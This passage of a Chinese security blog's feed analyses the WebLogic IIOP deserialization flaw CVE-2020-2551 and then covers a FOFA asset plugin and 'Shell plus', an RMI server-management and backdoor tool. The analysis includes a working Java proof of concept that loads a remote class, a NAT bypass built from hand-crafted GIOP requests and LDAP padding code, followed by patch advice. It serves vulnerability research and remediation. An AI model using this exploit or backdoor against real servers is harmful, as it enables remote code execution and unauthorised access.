Architecture）也就是公共对象请求代理体系结构，是OMG（对象管理组织）制定的一种标准的面向对象应用程序体系规范。其提出是为了解决不同应用程序间的通信，曾是分布式计算的主流技术。</p><p>一般来说CORBA将其结构分为三部分，为了准确的表述，我将用其原本的英文名来进行表述：</p><ul><li><code>naming service</code></li><li><code>client side</code></li><li><code>servant side</code></li></ul><p>这三部分组成了CORBA结构的基础三元素，而通信过程也是在这三方间完成的。我们知道CORBA是一个基于网络的架构，所以以上三者可以被部署在不同的位置。<code>servant side</code> 可以理解为一个接收 <code>client side</code> 请求的服务端；<code>naming service</code> 对于 <code>servant side</code> 来说用于服务方注册其提供的服务，对于 <code>client side</code> 来说客户端将从 <code>naming service</code> 来获取服务方的信息。这个关系可以简单的理解成目录与章节具体内容的关系：目录即为 <code>naming service</code>，<code>servant side</code> 可以理解为具体的内容，内容需要首先在目录里面进行注册，这样当用户想要访问具体内容时只需要首先在目录中查找到具体内容所注册的引用（通常为页数），这样就可以利用这个引用快速的找到章节具体的内容。</p><h2 id="神奇的7001端口"><a href="#神奇的7001端口" class="headerlink" title="神奇的7001端口"></a>神奇的7001端口</h2><p>首先我们来分析 weblogic 神奇的 7001 端口，正常情况下我们通过 7001 端口发送 HTTP 协议时会响应 HTTP 协议的内容，发送 T3 协议的数据包时响应 T3 的响应数据包，发送 IIOP 协议的数据包时响应 IIOP 的数据包。该端口非常的神奇，我们通过什么协议访问该端口该端口会响应对应的协议包内容。</p><p><img src="https://img.zhiiyun.com/blog_28b7f813cb02fa6284f51bab6beb6c39" alt="HTTP 协议"></p><p>通过浏览器进行访问 weblogic 的 7001 端口可以发现响应的协议类型也为HTTP。</p><p><img src="https://img.zhiiyun.com/blog_b73711d96a80a6868a129fb74369b827" alt="IIOP 协议"></p><p>上图通过 IIOP 进行发包响应内容为为 IIOP 内容信息，IIOP 是一种通过 TCP/IP 连接交换 GIOP （通用对象请求代理间通信协议）信息的协议。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该漏洞主要是因为 Webloigc 默认开放 IIOP 协议，并且 <code>JtaTransactionManager</code> 并未做黑名单过滤导致漏洞发生，以下为整个测试 POC（该 POC 来自互联网），后续代码调试也是基于该代码进行调试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String ip = &quot;127.0.0.1&quot;;</span><br><span class="line">        String port = &quot;7001&quot;;</span><br><span class="line">        Hashtable&lt;String, String&gt; env = new Hashtable&lt;String, String&gt;();</span><br><span class="line">        env.put(&quot;java.naming.factory.initial&quot;, &quot;weblogic.jndi.WLInitialContextFactory&quot;);</span><br><span class="line">        env.put(&quot;java.naming.provider.url&quot;, String.format(&quot;iiop://%s:%s&quot;, ip, port));</span><br><span class="line">        Context context = new InitialContext(env);</span><br><span class="line">        // get Object to Deserialize</span><br><span class="line">        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();</span><br><span class="line">        jtaTransactionManager.setUserTransactionName(&quot;rmi://127.0.0.1:1099/Exploit&quot;);</span><br><span class="line">        Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(&quot;pwned&quot;, jtaTransactionManager), Remote.class);</span><br><span class="line">        context.bind(&quot;hello&quot;, remote);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>基于公布的POC，整个利用过程就为：</p><ol><li>通过 Weblogic 的IP与端口通过 <code>weblogic.jndi.WLInitialContextFactory</code> 类进行 IIOP 协议数据交互。</li><li>基于 <code>JtaTransactionManager</code> 设置 RMI 加载地址。</li><li>通过 <code>ysoserial</code> 构建 Gadgets 并且通过 IIOP 进行绑定，并且触发漏洞。</li></ol><p><img src="https://img.zhiiyun.com/blog_3682760c6c580bb42481579952e4bea4" alt=""></p><h2 id="weblogic-解析流程"><a href="#weblogic-解析流程" class="headerlink" title="weblogic 解析流程"></a>weblogic 解析流程</h2><p><strong>注：weblogic流程是基于 weblogic 12.2.1.3.0 进行测试研究。</strong></p><h3 id="weblogic-调试"><a href="#weblogic-调试" class="headerlink" title="weblogic 调试"></a>weblogic 调试</h3><p>修改目录 <code>user_project/domains/bin</code> 目录中 <code>setDomainEnv.cmd</code> 或者 <code>setDomainEnv.sh</code>  文件，加<code>if %debugFlag == &quot;false&quot;%</code> 之前加入 <code>set debugFlag=true</code>，并且重新启动 weblogic，然后将 weblogic 复制到 idea 项目中，并且添加 Libraries</p><p><img src="https://img.zhiiyun.com/blog_e13383958b9d71be86b08ed49d973fbc" alt=""></p><p>新增 Remote 方式进行远程调试。</p><p><img src="https://img.zhiiyun.com/blog_2ac41e50502f2252618ddb9574b633f1" alt=""></p><p>docker 调试可参考 <a href="https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html" target="_blank" rel="noopener">https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html</a></p><h3 id="解析到序列化"><a href="#解析到序列化" class="headerlink" title="解析到序列化"></a>解析到序列化</h3><p>前面我们说到 7001 神奇的端口，weblogic 默认是 7001 端口进行接收 IIOP 请求。可以通过 <code>com.oracle.weblogic.iiop.jar!weblogic.iiop.ConnectionManager#dispatch</code> 可以看到所有 IIOP 的请求信息。<br><img src="https://img.zhiiyun.com/blog_d53edfc17c07ffb334ae3eafe8fd5c78" alt=""></p><p>然后在 <code>weblogic.rmi.internal.wls.WLSExecuteRequest#run</code> 进行调用 <code>weblogic.rmi.internal.BasicServerRef#handleRequest</code> 。</p><p><img src="https://img.zhiiyun.com/blog_3752224b78e977271b3a5177d9568d85" alt=""></p><p>然后在通过 <code>weblogic.rmi.internal.BasicServerRef#handleRequest</code> 调用 <code>weblogic.rmi.internal.BasicServerRef#handleRequest</code> 最终调用 <code>invoker.invoke</code> 。</p><p><img src="https://img.zhiiyun.com/blog_22497afdc34ce1e85fad55e3a617c0cf" alt=""></p><p>以下为到 <code>invoker.invoke</code> 的调用链：</p><p><img src="https://img.zhiiyun.com/blog_1e47fc1a0b7d0aaa97440e5a06aa2c78" alt=""></p><p>最终实现的方法在 <code>com.weblogic.rmi.cluster.ClusterableServerRef#invoke</code> 方法中。</p><p><img src="https://img.zhiiyun.com/blog_b25c9e665882e168c2b868eeca21060a" alt=""></p><p>进入该方法之后会 <code>objectMethods.get(iioprequest.getMethod())</code> 进行获取是否为空，如果为空的话会调用<code>this.delegate._invoke(iioprequest.getMethod(), iioprequest.getInputStream(), rh)</code> 进行处理，由于在发送包的时候执行的操作类型 <code>bind_any()</code> ，该类型不存在 <code>objectMethods</code> 变量中最终会调用 <code>this.delegate._invoke</code> ，具体实现的类为<code>weblogic.corba.cos.naming._NamingContextAnyImplBase#_invoke</code>：</p><p><img src="https://img.zhiiyun.com/blog_5c05db4dc1b2d1c37c50245c0e661043" alt=""></p><p><img src="https://img.zhiiyun.com/blog_00d3c202b37382b573328eabd95d4eef" alt=""></p><p>在 <code>_invoke</code> 方法中获取执行的方法，我们执行的 <code>bind_any</code> 最终会执行到 <code>case 0</code> 的代码块中，最终调用<code>n = WNameHelper.read(in);$result = in.read_any();this.bind_any(n, $result);out = $rh.createReply();</code>代码块。</p><p><img src="https://img.zhiiyun.com/blog_c32bb68166ec5307c078462620e3513e" alt=""></p><p>其中 <code>WNameHelper.read(in)</code> 通过读取 <code>IOR</code> 中的信息用于注册到 <code>ORB</code> 的流程中。</p><p><code>in.read_any()</code> 最后执行 <code>weblogic.corba.idl.AnyImpl#read_value_internal</code> 处理对应的流程：</p><p><img src="http://img.zhiiyun.com/blog_288ba72718ded1f227a9a72cdd9247ac" alt=""></p><p><img src="http://img.zhiiyun.com/blog_53a49690d047ee771853534cab39a9aa" alt=""></p><p>以下为 <code>read_any</code> 到 <code>read_value_internal</code> 的调用链：</p><p><img src="https://img.zhiiyun.com/blog_035306e2c706fe64a96726490029dbee" alt=""></p><p>可以看到最后进行 <code>weblogic.corba.idl.AnyImpl#read_value()</code> 进行读取反序列化反序列化，然后通过以下调用链执行反射并且通过  <code>weblogic.iiop.IIOPInputStream#read_value</code> 通过反射进行获取实例。</p><p> <img src="https://img.zhiiyun.com/blog_09cb56cb425d7171075c5bf523a2b432" alt=""></p><p><img src="https://img.zhiiyun.com/blog_1f233fce8d7ca55cf19a603f397b3e81" alt=""></p><p>通过实例化之后 <code>Serializable news = (Serializable)ValueHandlerImpl.readValue(this, osc, s);</code> 然后通过<code>weblogic.iiop.ValueHandlerImpl#readValue</code>进行读取内容</p><p><img src="https://img.zhiiyun.com/blog_b4ea51fd6ac2c815c1c17572b076f8dd" alt=""></p><p>!<img src="https://img.zhiiyun.com/blog_b84d0479d2129c19d1d1d7fc5fc6fcc3" alt=""></p><p><img src="https://img.zhiiyun.com/blog_3ec65df3cd07e5af3129ee7e935c7751" alt=""></p><p>基于之前 <code>JtaTransactionManager</code> 进行读取流内容进行 <code>this.readObjectMethod.invoke(obj, in)</code> 然后进入 <code>JtaTransactionManager</code> 处理流程<br><img src="https://img.zhiiyun.com/blog_57155da10133ed6aa20f1f18accc8900" alt=""></p><p><img src="https://img.zhiiyun.com/blog_bba9ed64ae1b78398b9d34c7c2ad4814" alt=""></p><p>进入 <code>com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager#readObject</code> 整个流程为：</p><p><img src="https://img.zhiiyun.com/blog_9521a6476096ffd90086688f2e942144" alt=""></p><p>进入 <code>com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager#readObject</code> 后首先会默认读取 <code>defaultReadObject</code> 然后创建 <code>JndiTemplate</code> 提供 <code>this.initUserTransactionAndTransactionManager</code> 进行使用注入远程 JNDI 连接。</p><p><img src="https://img.zhiiyun.com/blog_bba9ed64ae1b78398b9d34c7c2ad4814" alt=""></p><p><code>this.initUserTransactionAndTransactionManager</code> 会进行调用远程的 JNDI 连接</p><p><img src="https://img.zhiiyun.com/blog_2b7f5121aef84e64fed47283d8e42f85" alt=""></p><p><img src="https://img.zhiiyun.com/blog_3fe302d36194cad2358456f8db748846" alt=""></p><p>看到 <code>this.getJndiTemplate().lookup</code> ，最终在 <code>com.bea.core.repackaged.springframework.jndi.JndiTemplate#lookup</code> 进行操作至此结束。</p><p><img src="https://img.zhiiyun.com/blog_0a32c7d702549771652d25c20deab969" alt=""></p><p>同样已经触发并且加载远程的<code>Class</code> 类。</p><p><img src="https://img.zhiiyun.com/blog_d09a2d1da28207a53f420390a3d8bd5b" alt=""></p><h2 id="POC-的不足之处"><a href="#POC-的不足之处" class="headerlink" title="POC 的不足之处"></a>POC 的不足之处</h2><p>在背景中，笔者说明 CVE-2020-2551 漏洞公开的 POC ，有部分不足导致漏洞检测效率降低，下面章节我们来进行深入分析。</p><h3 id="class-编译问题"><a href="#class-编译问题" class="headerlink" title="class 编译问题"></a>class 编译问题</h3><p>在受影响 Oracle WebLogic Server 10.3.6.0.0 与 JDK 版本有非常大的关系，如果该机器版本为 1.6 版本必须要为 1.6 ，如果高于次版本会执行失败（低版本的 JDK 不兼容高版本的 JDK ），但是所有 LDAP 以及 HTTP 请求信息仍然有效。</p><p>解决方案为利用 POC 设置编译版本来进行处理：</p><p> <code>javac Poc.java -source 1.6 -target 1.6</code></p><h3 id="JDK-版本问题"><a href="#JDK-版本问题" class="headerlink" title="JDK 版本问题"></a>JDK 版本问题</h3><p>在安装 Oracle WebLogic Server 时需要进行需要指定 JDK 版本进行安装，如未有 JDK 会导致安装失败，安装时的 JDK 有非常大的关系，这次的漏洞主要是通过 <code>JtaTransactionManager</code> 来进行加载 LDAP 协议的内容，早在 JDK 1.7 时 Oracle 官方针对 RMI 、 LDAP 进行了限制，所在在使用时尽量使用 LDAP 协议。</p><p><img src="https://img.zhiiyun.com/blog_2f1466808c9b9238487bfb5b5291241c" alt=""></p><h3 id="Weblogic-版本问题"><a href="#Weblogic-版本问题" class="headerlink" title="Weblogic 版本问题"></a>Weblogic 版本问题</h3><p>经过测试研究发现以下情况：</p><table><thead><tr><th style="text-align:center">jar 版本</th><th style="text-align:center">weblogic 版本</th><th style="text-align:center">成功情况</th></tr></thead><tbody><tr><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">成功</td></tr><tr><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">成功</td></tr><tr><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">失败</td></tr><tr><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">失败</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">成功</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">成功</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">失败</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">失败</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">失败</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">失败</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">成功</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">成功</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">失败</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">失败</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">成功</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">成功</td></tr></tbody></table><p>最后总结 10.3.6.0.0 或 12.1.3.0.0 版本测试成功 10.3.6.0.0 和 12.1.3.0.0，12.2.1.3.0 或 12.2.1.4.0 版本测试成功 12.2.1.3.0 和 12.2.1.4.0，我把这种情况分为了两大版本，10.3.6.0.0 和 12.1.3.0.0 为一个版本（低版本），12.2.1.3.0 和 12.2.1.4.0 为另外一个版本，所以完整的 POC 需要兼容俩个版本的验证，比较好一点的做法就是通过抓包然后将2个包的内容进行多次发送，或者在利用的前提得知 Weblogic 使用的操作版本，一般 weblogic 的版本会在 <code>https?://host//console/login/LoginForm.jsp</code> 页面会现实版本。</p><p><img src="https://img.zhiiyun.com/blog_5f3677ea70101dd2457fc1fdfa57f695" alt=""></p><h3 id="验证问题"><a href="#验证问题" class="headerlink" title="验证问题"></a>验证问题</h3><p>在测试过程中，可能都使用请求 LDAP 协议读取远程的 class 文件，然后才可以执行验证代码，这样做会导致多次发包给 DNSLOG 平台进行验证，可能会导致验证的问题。</p><p>在前面讲到解析的流程中，我们看到有 <code>lookup</code> 去LDAP读取远程的 class 文件。如果请求的协议为不存在的某一个协议的话就会出现以下情况：</p><p><img src="https://img.zhiiyun.com/blog_b636c55154aff1b5170fd0fac1d95078" alt=""></p><p><img src="https://img.zhiiyun.com/blog_9d020c32d51dd68db656a8a680b94452" alt=""></p><p><img src="https://img.zhiiyun.com/blog_8c139c1d110144038ce9617d4395f773" alt=""></p><p>通过 Wireshark 查看，如果发送不存在的协议会响应回复 <code>System Exception</code> 错误信息：</p><p><img src="https://img.zhiiyun.com/blog_2129b4ddb22ec3b5c287e79384f860e6" alt=""></p><p>如果成功会进行响应 <code>User Exception</code> 信息：</p><p><img src="https://img.zhiiyun.com/blog_2ccb4d63e14012c5df60f19767955baf" alt=""></p><p>那么可以基于该情况进行通过转换构造异常来进行判断漏洞是否存在。</p><h3 id="NAT-网络问题"><a href="#NAT-网络问题" class="headerlink" title="NAT 网络问题"></a>NAT 网络问题</h3><p>NAT 网络问题是一个非常要命的问题，因为 weblogic 在运行时都是在内网运行的的，外网访问的 weblogic 全部都是转发出去的，这样就会出现一个问题配置的 IP 都为内网地址，就会导致无法正常测试成功。</p><p><strong>注：NAT 网络测试仅通过 Docker 进行测试，并未针对互联网进行测试。</strong></p><p>正常使用工具进行测试时会出现会响应内网绑定 IP 地址然后一直进行 redict，并且在最后抛出 <code>time out</code> 问题。</p><p><img src="https://img.zhiiyun.com/blog_7c710402e6b4cddf97600b9786255578" alt=""><br><img src="https://img.zhiiyun.com/blog_bae433e11cc0c247f74036c5560e434b" alt=""></p><p>针对这种情况只能通过自定义实现 GIOP 协议来绕过该方式：</p><ol><li>请求 LocationRequest，获取 key 。</li><li>请求Request， op=_non_existent，打开 IIOP 通道。</li><li>请求Request，op=bind_any，进行发送恶意序列化内容。</li></ol><p>通过 Wireshark 我们可以看到之前测试靶场时会发包以下内容：<br><img src="https://img.zhiiyun.com/blog_4ee6e9aea3907c0f3bbdfd15e5457d03" alt=""></p><p>我们可以基于之前发送的 <code>op=_non_existent</code> 进行重新构造，修改 iiop 地址：</p><p><img src="https://img.zhiiyun.com/blog_60217953a771b8509db929d8912547f1" alt=""></p><p>在重新  <code>op=_non_existent</code>  发包时需要首先获取 <code>Key Address</code> （key 存在有效期时间）否则会进行一直进行 <code>Location Forward</code>，获取 <code>Key</code> 信息并且修改 iiop 地址打开 IIOP 通道，最后进行发送恶意序列化内容。</p><p><img src="https://img.zhiiyun.com/blog_50ea0a97161aaf01fee9a690d30caeca" alt=""><br><img src="https://img.zhiiyun.com/blog_bcc86db8176def94b5ce1f576d3cf443" alt=""></p><h3 id="LDAP-填充问题"><a href="#LDAP-填充问题" class="headerlink" title="LDAP 填充问题"></a>LDAP 填充问题</h3><p>通过 socket 发包的形式进行发包时，如需要进行替换 LDAP URL 时，正常修改 URL 会一直导致发包响应错误，需要通过  <code>#</code> 进行 panding 构造指定字节长度的 URL 然后通过 <code>#</code> 填充。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String append = &quot;&quot;;</span><br><span class="line">for (int i = ldapUrl.length(); i &lt; 0x60; i++) &#123;</span><br><span class="line">    append += &quot;#&quot;;</span><br><span class="line">&#125;</span><br><span class="line">String url = ldapUrl+append;</span><br><span class="line">System.out.println(url);</span><br></pre></td></tr></table></figure></p><h2 id="Weblogic-的问题"><a href="#Weblogic-的问题" class="headerlink" title="Weblogic 的问题"></a>Weblogic 的问题</h2><p><strong> 截止 2020 年 3 月 4 日，通过 Oracle 官方进行下载 weblogic 时，通过研究发现该漏洞依然存在可以利用（所有受影响版本），需要额外安装补丁。</strong><br>如下文件为下文件MD5值以及下载时间：</p><table><thead><tr><th style="text-align:center">文件名称</th><th style="text-align:center">MD5</th><th style="text-align:center">SHA1</th><th style="text-align:center">创建时间</th></tr></thead><tbody><tr><td style="text-align:center">wls1036_generic.jar</td><td style="text-align:center">33D45745FF0510381DE84427A7536F65</td><td style="text-align:center">FFBC529D598EE4BCD1E8104191C22F1C237B4A3E</td><td style="text-align:center">‎2020‎-03‎-04‎</td></tr><tr><td style="text-align:center">fmw_12.1.3.0.0_wls.jar</td><td style="text-align:center">8378FE936B476A6F4CA5EFA465A435E3</td><td style="text-align:center">5B1761BA2FC31DC8C32436159911E55097B00B1E</td><td style="text-align:center">‎2020‎-03‎-04‎</td></tr><tr><td style="text-align:center">fmw_12.2.1.3.0_wls.jar</td><td style="text-align:center">6E7105521029058AD64A5C6198DB09F7</td><td style="text-align:center">74345654AF2C60EA13CF172A7851039A64BFE7E1</td><td style="text-align:center">‎2017-08‎-21‎</td></tr><tr><td style="text-align:center">fmw_12.2.1.4.0_wls.jar</td><td style="text-align:center">AA090712069684991BA27E4DE9ED3FF6</td><td style="text-align:center">CFAA5752D33DD5FFB7A57F91686E15B465367311</td><td style="text-align:center">‎2019-09‎-13‎</td></tr></tbody></table><p>建议目前已经安装最新版 weblogic 时同排查该漏洞，如有漏洞建议立即安装补丁或通过修复方案进行修复，防止被不法分子利用。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li>通过 weblogic 控制台进行关闭 IIOP 协议，然后重新启动 weblogic服务。</li><li>安装 weblogic <a href="https://www.oracle.com/security-alerts/cpujan2020.html" target="_blank" rel="noopener">修复补丁</a>，进行修复。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.anquanke.com/post/id/197605" target="_blank" rel="noopener">Weblogic IIOP反序列化漏洞（CVE-2020-2551） 漏洞分析</a></li><li><a href="https://www.anquanke.com/post/id/199695" target="_blank" rel="noopener">WebLogic WLS核心组件RCE分析（CVE-2020-2551）</a></li><li><a href="https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html" target="_blank" rel="noopener">IDEA+docker，进行远程漏洞调试（weblogic）</a></li><li><a href="https://lucifaer.com/2020/02/20/Java%20CORBA%E7%A0%94%E7%A9%B6/" target="_blank" rel="noopener">Java CORBA研究</a></li><li><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic </tag>
            
            <tag> iiop </tag>
            
            <tag> cve </tag>
            
            <tag> giop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FOFA Pro View：FOFA Pro 资产展示浏览器插件</title>
      <link href="/posts/1e051527/"/>
      <url>/posts/1e051527/</url>
      
        <content type="html"><![CDATA[<p>FOFA Pro view 是一款FOFA Pro 资产展示浏览器插件，目前兼容<a href="https://www.google.com/chrome/" target="_blank" rel="noopener">Chrome</a>、<a href="https://www.mozilla.org/" target="_blank" rel="noopener">Firefox</a>、<a href="https://www.opera.com/" target="_blank" rel="noopener">Opera</a>。</p><p>The Fofa Pro View plugin tells you where the website is hosted (country, city), who owns the IP and what other services/ ports are open.</p><p>The Fofa Pro View plugin for Chrome automatically checks whether Fofa Pro has any information for the current website. Is the website also running FTP, DNS, SSH or some unusual service? With this plugin you can see all the info that Fofa Pro has collected on a given website/ domain.</p><p>项目地址：<a href="https://github.com/0nise/fofa_view" target="_blank" rel="noopener">https://github.com/0nise/fofa_view</a></p><p>FOFA Pro view 0.0.2版本已更新，Firefox可直接在商城更新，Chrome 预计2019年2月6或2月7日可进行安装更新。<br>下载地址：<a href="https://github.com/0nise/fofa_view/releases" target="_blank" rel="noopener">https://github.com/0nise/fofa_view/releases</a><br>更新日志：</p><ul><li>优化：面板上面文字无法直接复制（如ip地址），建议让文字可选取，增加使用便利性。</li><li>优化：刷新确认按钮第一次打开有半截藏在屏幕里点不到。</li><li>优化：网络加载较慢导致样式、图标加载失败问题。</li><li>新增：表格Host字段。</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><img src="https://img.zhiiyun.com/blog_038998ea977f5b9617b992eeb17e08c6" alt=""></p><h3 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h3><h4 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h4><p>下载版本：<a href="https://github.com/0nise/fofa_view/releases" target="_blank" rel="noopener">https://github.com/0nise/fofa_view/releases</a></p><p><img src="https://img.zhiiyun.com/blog_d8c4407eaad1255f3184fc365fb62fdc" alt=""></p><p><img src="https://img.zhiiyun.com/blog_8b5830ac17694a521f23d2c4452bf39c" alt=""></p><p>解压插件压缩包，打开 <a href="chrome://extensions/" target="_blank" rel="noopener">chrome://extensions/</a> 并且开启开发者模式，点击 <code>加载已解压的扩展程序</code> 选择已经解压的插件目录进行加载。</p><h4 id="商城安装"><a href="#商城安装" class="headerlink" title="商城安装"></a>商城安装</h4><p><img src="https://img.zhiiyun.com/blog_852190fe478cd8a0a7455a6a5769b8d0" alt=""></p><h3 id="FireFox"><a href="#FireFox" class="headerlink" title="FireFox"></a>FireFox</h3><h4 id="手动安装-1"><a href="#手动安装-1" class="headerlink" title="手动安装"></a>手动安装</h4><p>下载版本：<a href="https://github.com/0nise/fofa_view/releases" target="_blank" rel="noopener">https://github.com/0nise/fofa_view/releases</a></p><p><img src="https://img.zhiiyun.com/blog_549e7970f48e38b93c77a1c27a7780f2" alt=""></p><p>解压插件压缩包，打开 <a href="about:debugging#/runtime/this-firefox" target="_blank" rel="noopener">about:debugging#/runtime/this-firefox</a> 点击<code>临时载入附加组件…</code>选择下载的插件压缩包。</p><h4 id="商城安装-1"><a href="#商城安装-1" class="headerlink" title="商城安装"></a>商城安装</h4><p><img src="https://img.zhiiyun.com/blog_1c20cdb866988c902dd8730190fceac6" alt=""></p><h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><p>2019-01-04</p><ul><li>优化：面板上面文字无法直接复制（如ip地址），建议让文字可选取，增加使用便利性</li><li>优化：刷新确认按钮第一次打开有半截藏在屏幕里点不到</li><li>优化：网络加载较慢导致样式、图标加载失败问题。</li><li>新增：表格Host字段<br>2019-12-31</li><li>Chrome、Firefox可在商城直接搜索安装<br>2019-12-29</li><li>添加IP位置信息</li><li>添加资产信息</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> FOFA Pro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell plus 一款基于RMI的服务器管理工具</title>
      <link href="/posts/3a83e666/"/>
      <url>/posts/3a83e666/</url>
      
        <content type="html"><![CDATA[<p>Shell Plus 是基于 RMI 的一款服务器管工具，由服务端、注册中心、客户端进行组成。</p><h3 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h3><p>该工具用于服务器管理、攻防后门安全测试技术研究，禁止用于非法犯罪。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>RMI（Remote Method Invocation）远程方法调用。能够让在客户端Java虚拟机上的对象像调用本地对象一样调用服务端java 虚拟机中的对象上的方法。</p><p><img src="https://img.zhiiyun.com/blog_47d1970f0ec964b41b8206c79402496b" alt=""></p><p>RMI远方法程调用步骤： </p><ol><li>客户调用客户端辅助对象stub上的方法</li><li>客户端辅助对象stub打包调用信息（变量、方法名），通过网络发送给服务端辅助对象skeleton</li><li>服务端辅助对象skeleton将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象</li><li>调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象skeleton</li><li>服务端辅助对象将结果打包，发送给客户端辅助对象stub</li><li>客户端辅助对象将返回值解包，返回给调用者</li><li>客户获得返回值</li></ol><p>举个例子：</p><p>假设A公司是某个行业的翘楚，开发了一系列行业上领先的软件。B公司想利用A公司的行业优势进行一些数据上的交换和处理。但A公司不可能把其全部软件都部署到B公司，也不能给B公司全部数据的访问权限。于是A公司在现有的软件结构体系不变的前提下开发了一些RMI方法。B公司调用A公司的RMI方法来实现对A公司数据的访问和操作，而所有数据和权限都在A公司的控制范围内，不用担心B公司窃取其数据或者商业机密。</p><p>工具借用 RMI 的调用原理，所有的数据操作都是发生在服务端进行完成的，客户端通过注册中心进行调用服务端的代码在<strong>服务端</strong> 进行执行，最后将相应结果进行返回。</p><p>通过编写服务器管理代码，代码进行注册到服务中，然后由客户端进行调用该服务端代码执行操作。</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>开源地址：<a href="https://github.com/0nise/shell-plus" target="_blank" rel="noopener">https://github.com/0nise/shell-plus</a></p><p>自行编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/0nise/shell-plus</span><br><span class="line">cd shell-plus</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><p>发行版本：<a href="https://github.com/0nise/shell-plus/releases" target="_blank" rel="noopener">https://github.com/0nise/shell-plus/releases</a></p><p>开启服务端：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp shell-plus-1.0.jar Main &lt;port&gt; &lt;ip&gt; [pwd]</span><br></pre></td></tr></table></figure></p><p><img src="https://img.zhiiyun.com/blog_23c9b013e9d506072783eaa05fd5cae0" alt=""></p><p>例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp shell-plus-1.0.jar Main 3333 127.0.0.1 123456</span><br></pre></td></tr></table></figure></p><p>连接服务端管理服务器：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp shell-plus-1.0.jar Client &lt;port&gt; &lt;ip&gt; &lt;name&gt; [pwd]</span><br></pre></td></tr></table></figure></p><p><img src="https://img.zhiiyun.com/blog_60e4273e15a3a7e08d47d9b494f83dbb" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp shell-plus-1.0.jar Main 3333 127.0.0.1 3I3IF5liOOrw731Y 